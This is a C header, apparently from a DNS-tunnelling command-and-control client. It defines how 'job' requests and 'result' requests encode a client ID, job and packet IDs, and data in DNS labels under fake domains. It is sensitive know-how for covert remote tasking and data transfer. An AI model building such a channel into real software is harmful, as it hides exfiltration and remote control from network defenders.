#pragma once
#include "client.h"
#include "dns.h"
#include "util.h"

#include <stdbool.h>
#include <stdint.h>

/*

 * Result request (DNS request used for transfering job results)
 * -------------------------------------------------------------
 * label 0: client_id
 * label 1: job_id, packet_id, is_last
 * label 2: data
 * label 3: fake sub-domain
 * label 4: fake domain
 * label 5: fake TLD

 * Job request (DNS request used for asking for an available job)
 * --------------------------------------------------------------
 * label 0: client_id
 * label 1: fake sub-domain
 * label 2: fake domain
 * label 3: fake TLD

*/
typedef enum req_type {
  REQ_TYPE_RESULT = 0,
  REQ_TYPE_JOB    = 1,
} req_type_t;

#define CLIENT_ID_SIZE 8
#define JOB_ID_SIZE    6

#define REQ_DATA_SIZE_MAX (DNS_LABEL_LIMIT / ENCODED_BYTE_SIZE)
#define REQ_LABEL_MAX     6

typedef struct req {
  req_type_t type;
  char       client_id[CLIENT_ID_SIZE + 1];
  char       job_id[JOB_ID_SIZE + 1];
  uint64_t   packet_id;
  bool       is_last;
  char      *data;
  uint32_t   data_size;
} req_t;

void    req_new(req_t *req);
int64_t req_send(req_t *req, client_t *c);
bool    req_to_dns(req_t *req, dns_packet_t *p);
